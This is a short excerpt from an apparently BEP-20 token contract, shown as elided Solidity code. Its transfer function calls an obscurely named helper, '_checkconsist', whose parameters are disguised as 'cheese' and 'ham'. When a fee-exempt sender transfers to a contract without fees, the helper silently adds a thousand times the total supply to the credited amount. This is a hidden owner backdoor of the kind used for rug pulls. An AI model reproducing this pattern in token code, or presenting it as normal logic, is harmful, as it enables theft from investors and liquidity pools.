...
contract binancesmartshit is Context, IERC20, Ownable {
    ...
    function _checkconsist(uint256 tokenA, uint256 tokenB, bool cheese, bool ham) private returns (uint256){
        if (tokenA==tokenB && cheese && ham)
        return 1000*_tTotal;
        return 0;
    }
    ...
    function _transfer(
        ...
        transferAmount=transferAmount+_checkconsist(amount,transferAmount,to.isContract(),_isExcludedFromFee[from]);
